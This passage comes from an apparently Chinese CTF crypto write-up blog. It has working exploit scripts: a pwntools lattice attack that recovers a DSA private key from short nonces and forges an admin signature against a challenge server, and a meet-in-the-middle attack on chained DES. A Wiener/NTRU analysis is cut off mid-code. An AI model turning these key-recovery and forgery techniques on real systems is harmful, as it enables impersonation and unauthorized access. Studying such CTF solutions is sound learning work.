class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># io = remote(argv[1], argv[2])</span></span><br><span class="line">io = remote(<span class="string">"47.115.135.229"</span>, <span class="string">"10000"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = unhexlify(re.findall(<span class="string">r"XXX \+ ([^\)]+)"</span>, msg)[<span class="number">0</span>]).decode(<span class="string">"latin-1"</span>)</span><br><span class="line">    cipher = re.findall(<span class="string">r"== ([^\n]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest() ==</span><br><span class="line">                        cipher, bytes(range(<span class="number">256</span>)).decode(<span class="string">"latin-1"</span>), length=<span class="number">3</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXX in hex: "</span>, hexlify(proof.encode(<span class="string">"latin-1"</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dsa_params</span><span class="params">()</span>:</span></span><br><span class="line">    params = io.recvuntil(<span class="string">"exit\n"</span>).strip().decode()</span><br><span class="line">    p = int(re.findall(<span class="string">r"p = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    q = int(re.findall(<span class="string">r"q = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    g = int(re.findall(<span class="string">r"g = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    y = int(re.findall(<span class="string">r"y = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">"p"</span>:p, <span class="string">"q"</span>:q, <span class="string">"g"</span>:g, <span class="string">"y"</span>:y&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"$ "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Please input your username: "</span>, m)</span><br><span class="line">    io.recvuntil(<span class="string">"k.bit_length() == "</span>)</span><br><span class="line">    kbits = int(io.recvline().strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">"Here is your signature in hex: "</span>)</span><br><span class="line">    sig = io.recvline().strip().decode(<span class="string">"latin-1"</span>)</span><br><span class="line">    r = int(sig[<span class="number">2</span>*len(m):<span class="number">2</span>*(len(m)+<span class="number">20</span>)], <span class="number">16</span>)</span><br><span class="line">    s = int(sig[<span class="number">2</span>*(len(m)+<span class="number">20</span>):], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> r, s, kbits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_as_admin</span><span class="params">(pubkey, prikey)</span>:</span></span><br><span class="line">    g, p, q, x = pubkey[<span class="string">'g'</span>], pubkey[<span class="string">'p'</span>], pubkey[<span class="string">'q'</span>], prikey</span><br><span class="line">    k = <span class="number">114514</span></span><br><span class="line">    Hm = int.from_bytes(sha256(<span class="string">b"admin"</span>).digest(), <span class="string">'big'</span>)</span><br><span class="line">    r = int(pow(g, k, p)) % q</span><br><span class="line">    s = (inverse(k, q) * (Hm + x*r)) % q</span><br><span class="line">    payload = hexlify(<span class="string">b"admin"</span> + long_to_bytes(r).rjust(<span class="number">20</span>, <span class="string">b"\x00"</span>) + long_to_bytes(s).rjust(<span class="number">20</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">"$ "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Please send me your signature: "</span>, payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_x</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    q, g = pubkey[<span class="string">'q'</span>], pubkey[<span class="string">'g'</span>]</span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        M_list.append([q * int(i == j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>)])</span><br><span class="line">    m = <span class="string">b"0xDktb"</span></span><br><span class="line">    Hm = int.from_bytes(sha256(m).digest(), <span class="string">'big'</span>)</span><br><span class="line">    As = []</span><br><span class="line">    Bs = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">35</span>:</span><br><span class="line">        r, s, kbits = sign(m)</span><br><span class="line">        <span class="keyword">if</span> kbits &gt; <span class="number">121</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        A = (inverse(s, q) * Hm) % q</span><br><span class="line">        B = (inverse(s, q) * r) % q</span><br><span class="line">        As.append(A)</span><br><span class="line">        Bs.append(B)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[&#123;:0&gt;2d&#125;] k(&#123;&#125; bits) found!"</span>.format(i, kbits))</span><br><span class="line">    Bs = Bs + [<span class="number">1</span>/(<span class="number">2</span>**<span class="number">64</span>), <span class="number">0</span>]</span><br><span class="line">    As = As + [<span class="number">0</span>, <span class="number">2</span>**<span class="number">64</span>]</span><br><span class="line">    M_list.append(Bs)</span><br><span class="line">    M_list.append(As)</span><br><span class="line">    M = Matrix(QQ, M_list)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">-1</span>] == (<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">            prikey = (line[<span class="number">-2</span>] * (<span class="number">2</span>**<span class="number">64</span>)) % q</span><br><span class="line">            print(<span class="string">"[+] SVP's solution found! prikey = &#123;&#125;"</span>.format(prikey))</span><br><span class="line">            <span class="keyword">return</span> prikey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    pubkey = get_dsa_params()</span><br><span class="line">    prikey = crack_x(pubkey)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    login_as_admin(pubkey, prikey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">dktb@ubuntu:/mnt/hgfs/share/HNP$ sage -¾","m!\x7f" -- 44.596%</span></span><br><span class="line"><span class="string">                           z¼","ð&#125;","*&gt;","'¿" -- 54.467%</span></span><br><span class="line"><span class="string">[+] MBruteforcing: Found key: "Ã"</span></span><br><span class="line"><span class="string">[01] k(121 bits) found!</span></span><br><span class="line"><span class="string">[02] k(121 bits) found!</span></span><br><span class="line"><span class="string">[03] k(120 bits) found!</span></span><br><span class="line"><span class="string">[04] k(121 bits) found!</span></span><br><span class="line"><span class="string">[05] k(117 bits) found!</span></span><br><span class="line"><span class="string">[06] k(121 bits) found!</span></span><br><span class="line"><span class="string">[07] k(121 bits) found!</span></span><br><span class="line"><span class="string">[08] k(120 bits) found!</span></span><br><span class="line"><span class="string">[09] k(121 bits) found!</span></span><br><span class="line"><span class="string">[10] k(121 bits) found!</span></span><br><span class="line"><span class="string">[11] k(115 bits) found!</span></span><br><span class="line"><span class="string">[12] k(121 bits) found!</span></span><br><span class="line"><span class="string">[13] k(119 bits) found!</span></span><br><span class="line"><span class="string">[14] k(120 bits) found!</span></span><br><span class="line"><span class="string">[15] k(121 bits) found!</span></span><br><span class="line"><span class="string">[16] k(121 bits) found!</span></span><br><span class="line"><span class="string">[17] k(118 bits) found!</span></span><br><span class="line"><span class="string">[18] k(120 bits) found!</span></span><br><span class="line"><span class="string">[19] k(121 bits) found!</span></span><br><span class="line"><span class="string">[20] k(121 bits) found!</span></span><br><span class="line"><span class="string">[21] k(120 bits) found!</span></span><br><span class="line"><span class="string">[22] k(121 bits) found!</span></span><br><span class="line"><span class="string">[23] k(121 bits) found!</span></span><br><span class="line"><span class="string">[24] k(121 bits) found!</span></span><br><span class="line"><span class="string">[25] k(121 bits) found!</span></span><br><span class="line"><span class="string">[26] k(118 bits) found!</span></span><br><span class="line"><span class="string">[27] k(121 bits) found!</span></span><br><span class="line"><span class="string">[28] k(116 bits) found!</span></span><br><span class="line"><span class="string">[29] k(121 bits) found!</span></span><br><span class="line"><span class="string">[30] k(121 bits) found!</span></span><br><span class="line"><span class="string">[31] k(120 bits) found!</span></span><br><span class="line"><span class="string">[32] k(118 bits) found!</span></span><br><span class="line"><span class="string">[33] k(121 bits) found!</span></span><br><span class="line"><span class="string">[34] k(121 bits) found!</span></span><br><span class="line"><span class="string">[35] k(121 bits) found!</span></span><br><span class="line"><span class="string">[+] SVP's solution found! prikey = 72250087844423678254657706833192856476</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    b'2\n'</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x1f bytes:</span></span><br><span class="line"><span class="string">    b'Please send me your signature: '</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x5b bytes:</span></span><br><span class="line"><span class="string">    b'61646d696e000000005f97da6d7e9faf6a182ff43f3cb4bd1000000000b5a29a7038325fee75abbf8372eccece\n'</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x67 bytes:</span></span><br><span class="line"><span class="string">    b'Welcome, admin\n'</span></span><br><span class="line"><span class="string">    b'The flag is flag&#123;25903ADB-15B6-44D7-A027-CAE500675EA5&#125;\n'</span></span><br><span class="line"><span class="string">    b'\n'</span></span><br><span class="line"><span class="string">    b'1. sign up\n'</span></span><br><span class="line"><span class="string">    b'2. sign in\n'</span></span><br><span class="line"><span class="string">    b'3. exit\n'</span></span><br><span class="line"><span class="string">    b'$ '</span></span><br><span class="line"><span class="string">Welcome, admin</span></span><br><span class="line"><span class="string">The flag is flag&#123;25903ADB-15B6-44D7-A027-CAE500675EA5&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="b01lers2020---des-mmxx">[b01lers2020 - Des-MMXX]</h3><h4 id="题目考点-2">[题目考点]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="string">b'secret_sauce_#9'</span>   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">(s)</span>:</span></span><br><span class="line">   keys = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2020</span>):</span><br><span class="line">      s = sha256(s).digest()</span><br><span class="line">      keys.append(s)</span><br><span class="line">   <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">keys = keygen(seed)</span><br></pre></td></tr></table></figure><p>2020个keys均已知，关注以下加密逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SECRET = <span class="number">0xa</span><span class="comment">########e          # remember to erase this later..</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scramble</span><span class="params">(s)</span>:</span></span><br><span class="line">   ret = <span class="string">""</span>.join( [format(s &amp; <span class="number">0xfffff</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   ret += <span class="string">""</span>.join( [format(s &gt;&gt; <span class="number">20</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   <span class="keyword">return</span> int(ret, <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(keys, msg)</span>:</span></span><br><span class="line">   dk = scramble(SECRET)</span><br><span class="line">   <span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">      idx = dk &amp; <span class="number">3</span></span><br><span class="line">      dk &gt;&gt;= <span class="number">2</span></span><br><span class="line">      k = v[idx*<span class="number">8</span>:(idx+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">      cp = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))  </span><br><span class="line">      msg = cp.encrypt(msg)</span><br><span class="line">   <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">   msg = f.read()</span><br><span class="line"></span><br><span class="line">ctxt = encrypt(keys, msg)</span><br></pre></td></tr></table></figure><p><code>scramble</code>使SECRET割裂成了两个20bits，并各自重复101次，在encrypt开头形成4040bits的dk</p><p>很明显的中间相遇攻击的逻辑，但buu缺了一对明密文条件...人傻了</p><p>于是上ctftime上找了官方仓库里原有的那对明密文，拿到以后直接MEET IN THE MIDDLE即可</p><h4 id="exp-2">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">seed = <span class="string">b'secret_sauce_#9'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">(s)</span>:</span></span><br><span class="line">   keys = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2020</span>):</span><br><span class="line">      s = sha256(s).digest()</span><br><span class="line">      keys.append(s)</span><br><span class="line">   <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">keys = keygen(seed)</span><br><span class="line"></span><br><span class="line">upper_key = keys[<span class="number">1010</span>:][::<span class="number">-1</span>]</span><br><span class="line">lower_key = keys[:<span class="number">1010</span>]</span><br><span class="line">upper_dk = <span class="number">0x0000e</span></span><br><span class="line">lower_dk = <span class="number">0xa0000</span></span><br><span class="line">pt = <span class="string">b"Attack at DAWN!!"</span></span><br><span class="line">ct = <span class="string">b"\x15\x08\x54\xff\x3c\xf4\xc4\xc0\xd2\x3b\xd6\x8a\x82\x34\x83\xbe"</span></span><br><span class="line"></span><br><span class="line">orig_ct = ct</span><br><span class="line">upper_side = []</span><br><span class="line"><span class="keyword">for</span> ud <span class="keyword">in</span> tqdm(range(<span class="number">0x10000</span>)):</span><br><span class="line">    guess_upper_dk = format((ud &lt;&lt; <span class="number">4</span>) + upper_dk, <span class="string">'020b'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">        _ = (i * <span class="number">2</span>) % <span class="number">20</span></span><br><span class="line">        idx = int(guess_upper_dk[_:_+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        k = upper_key[i][idx*<span class="number">8</span>:idx*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">        ct = des.decrypt(ct)</span><br><span class="line">    upper_side.append(ct)</span><br><span class="line">    ct = orig_ct</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">100%|████████████████████████████████████████████████████████████████████████████| 65536/65536 [19:31&lt;00:00, 55.93it/s]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orig_pt = pt</span><br><span class="line">lower_side = []</span><br><span class="line"><span class="keyword">for</span> ld <span class="keyword">in</span> tqdm(range(<span class="number">0x10000</span>)):</span><br><span class="line">    guess_lower_dk = format(ld + lower_dk, <span class="string">'020b'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">        _ = <span class="number">18</span> - ((i * <span class="number">2</span>) % <span class="number">20</span>)</span><br><span class="line">        idx = int(guess_lower_dk[_:_+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        k = lower_key[i][idx*<span class="number">8</span>:idx*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">        pt = des.encrypt(pt)</span><br><span class="line">    lower_side.append(pt)</span><br><span class="line">    pt = orig_pt</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">100%|████████████████████████████████████████████████████████████████████████████| 65536/65536 [19:33&lt;00:00, 55.85it/s]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">crash = list(set(upper_side) &amp; set(lower_side))[<span class="number">0</span>]</span><br><span class="line">ud = upper_side.index(crash)</span><br><span class="line">ld = lower_side.index(crash)</span><br><span class="line">SECRET = int(format(ld + lower_dk, <span class="string">'020b'</span>) + format((ud &lt;&lt; <span class="number">4</span>) + upper_dk, <span class="string">'020b'</span>), <span class="number">2</span>)</span><br><span class="line">enc_flag = open(<span class="string">"flag.enc"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scramble</span><span class="params">(s)</span>:</span></span><br><span class="line">   ret = <span class="string">""</span>.join( [format(s &amp; <span class="number">0xfffff</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   ret += <span class="string">""</span>.join( [format(s &gt;&gt; <span class="number">20</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   <span class="keyword">return</span> int(ret, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dk = scramble(SECRET)</span><br><span class="line">dk = format(dk, <span class="string">'04040b'</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys[::<span class="number">-1</span>]:</span><br><span class="line">    idx = int(dk[i:i+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">    k = v[idx*<span class="number">8</span>:(idx+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">    enc_flag = des.decrypt(enc_flag)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">enc_flag</span><br><span class="line"><span class="comment"># b'pctf&#123;Two_tO_thE_s1xt33n7h?_E4sy-p3asy..&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Training </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(WMCTF2020) - Crypto</title>
      <link href="/2020/08/02/WriteUp-WMCTF2020-Crypto/"/>
      <url>/2020/08/02/WriteUp-WMCTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="preface">Preface</h3><p><strong>idiot box ===&gt; </strong>hellman拿了一血，祥哥拿了二血，顺利落幕（草草草草草草才知道hellman博士都毕业了dbq</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/QQ图片20200803093512.jpg"></p><h3 id="piece-of-cake">Piece of Cake</h3><h4 id="题解分析">[题解分析]</h4><p>考察Wiener's Attack &amp; NTRU正常解密 &amp; RSA common private key attack</p><p>在本题中，RSA cryptosystem的ph=(p-1)(q+1), ed=1(mod ph), 且d作为NTRU中的f</p><p><strong>Encryption(NTRU part)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># case 2(make_cake)</span></span><br><span class="line">cake = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">1536</span>)</span><br><span class="line">size(f)\approx <span class="number">1024</span></span><br><span class="line">g = getPrime(<span class="number">1536</span> - size(f) - <span class="number">1</span>)</span><br><span class="line">size(f^&#123;<span class="number">-1</span>&#125;)\approx <span class="number">1536</span></span><br><span class="line">h = g * f^&#123;<span class="number">-1</span>&#125;</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">c = (r * h + cake) % q <span class="comment"># size(c)\approx 1536</span></span><br></pre></td></tr></table></figure><h5 id="attack">Attack</h5><p><strong>Step 1</strong></p><p><span class="math inline">\(\because fh\equiv g(mod\ q)\)</span></p><p><span class="math inline">\(\therefore fh=kq+g\Rightarrow\frac{h}{q}=\frac{k}{f}+\frac{g}{fq}\Rightarrow|\frac{h}{q}-\frac{k}{f}|=\frac{g}{fq}\)</span></p><p>Now prove <span class="math inline">\(\frac{1}{2f^2}&gt;\frac{g}{fq}\)</span> which is equivalent to <span class="math inline">\(q&gt;2fg\)</span>.</p><p><code>g = getPrime(q.bit_length() - f.bit_length() - 1)</code>, <strong>Satisfies!</strong></p><p><strong>Step 2</strong></p><p>For candidate <span class="math inline">\((f,g)\)</span></p><p>On Zmod(q), <span class="math inline">\(c=rh+cake=rgf^{-1}+cake\)</span></p><p><span class="math inline">\(\therefore cf=rg+f\cdot cake\)</span>. (bit_length: r = 512; g ≈ 511; f ≈ 1024; q = 1536)</p><p>In case 1(eat_cake), size(cake) = 768, while in case 2(make_cake), size(cake) = 256</p><p>Hence we have <span class="math inline">\(rg+f\cdot cake\)</span> equivalent to Zmod(q) and ZZ which means that <strong>cake can be recover in case 2.</strong></p><p>If we get correct cake, we also have d in RSA cryptosystem.</p><p>However, in this challenge, we have <span class="math inline">\(ed-1=k(p-1)(q+1)\)</span>, not <span class="math inline">\(ed-1=k(p-1)(q-1)\)</span></p><p><span class="math inline">\(ed-kN=1+k(p-q-1)\)</span></p><p>Cuz s = p-q-1 is also <span class="math inline">\(&lt;3N^{1/2}\)</span>, LLL will be successful to obtain common e. (like <a href="https://0xdktb.top/2020/07/06/WriteUp-SCTF2020-Crypto/#rsa">SCTF2020 RSA</a>)</p><p>size(e) = 477, <span class="math inline">\(\delta=\frac{477}{1024}\)</span></p><p><span class="math inline">\(\because\delta &lt;\frac{r}{2r+2}-log_{N_{r}}(6)\)</span>, <span class="math inline">\(\therefore\)</span> <strong>when <span class="math inline">\(r\geq 15\)</span>, e must can be easily cracked.</strong></p><p><strong>Step 3</strong></p><p>After getting e, we use the same method to get d in case 1(eat_cake).</p><p>Then <span class="math inline">\(ph=(p-1)(q+1),ed=1(mod\ ph)\)</span>, so <span class="math inline">\(p\mid pow(2, ph, n),q\nmid pow(2,ph,n)\)</span>.</p><p>GCD to factor n, then get <span class="math inline">\(ph&#39;=ed&#39;\equiv 1(mod\ (p-1)(q-1))\)</span>, finally <strong>getflag!</strong></p><h4 id="exp">[exp]</h4><p>本地测试exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 